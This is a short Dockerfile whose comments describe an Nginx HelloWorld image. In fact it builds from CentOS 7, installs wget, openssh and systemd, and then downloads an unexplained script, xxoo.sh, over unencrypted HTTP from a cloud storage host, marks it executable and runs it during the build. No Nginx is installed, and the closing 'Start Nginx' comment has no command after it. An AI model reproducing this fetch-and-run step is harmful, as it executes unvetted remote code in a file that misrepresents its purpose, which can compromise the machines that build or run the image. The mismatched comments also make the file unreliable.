# The FROM instruction sets the Base Image for subsequent instructions.
# Using Nginx as Base Image
FROM daocloud.io/centos:7
MAINTAINER wdzaw@gmail.com

# The RUN instruction will execute any commands
# Adding HelloWorld page into Nginx server
RUN yum install wget -y
RUN yum install net-tools -y
RUN yum install openssh* -y
RUN yum install initscripts -y
RUN yum -y swap -- remove fakesystemd -- install systemd systemd-libs
RUN yum -y update; yum clean all; \
rm -f /lib/systemd/system/multi-user.target.wants/*;\
rm -f /etc/systemd/system/*.wants/*;\
rm -f /lib/systemd/system/local-fs.target.wants/*; \
rm -f /lib/systemd/system/sockets.target.wants/*udev*; \
rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \
rm -f /lib/systemd/system/basic.target.wants/*;\
rm -f /lib/systemd/system/anaconda.target.wants/*;
RUN cd /
RUN wget http://svn-10038864.cos.myqcloud.com/xxoo.sh
RUN chmod +x xxoo.sh
RUN ./xxoo.sh
# The EXPOSE instruction informs Docker that the container listens on the specified network ports at runtime
EXPOSE 80

# The CMD instruction provides default execution command for an container
# Start Nginx and keep it from running background
